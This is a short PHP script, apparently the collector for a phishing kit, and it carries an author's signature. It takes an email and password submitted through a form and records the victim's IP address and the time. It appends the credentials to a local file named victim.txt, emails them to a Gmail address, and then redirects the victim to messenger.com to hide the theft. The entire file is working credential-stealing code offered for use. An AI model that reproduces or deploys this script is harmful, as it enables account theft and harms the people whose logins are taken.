<?
  //                                         \\
  /*****************************************************************************\
   by ==> WolFeXe  
   => Ahmed Mando                                      
  \*****************************************************************************/
 
    $ip = getenv("REMOTE_ADDR");
    $message .= "=====> By Ahmed Mando <===== \n";
	$message .= "--------------  victim information  -------------\n";
	
	$date = gmdate ("d-n-Y");
    $time = gmdate ("H:i:s");
    
    $message .= "Log : $time / $date \n";
    $message .= "email: ".$_POST['email']."\n";
    $message .= "pass: ".$_POST['pass']."\n";


	
	$message .= "---------- By Ahmed Mando ---------\n";
	$subject = "new victim | $ip";
	$send = "wolfex.vip@gmail.com"; // ??????? ????? ??? ??????? ???????
	
	$file = fopen("victim.txt", 'a');
    fwrite($file, $message);

	$headers = 'From: https://www.facebook.com/Ahmed.Maher.Official10' . "\r\n";
	mail($send,$subject,$message,$headers);
    header("Location: https://www.messenger.com");?>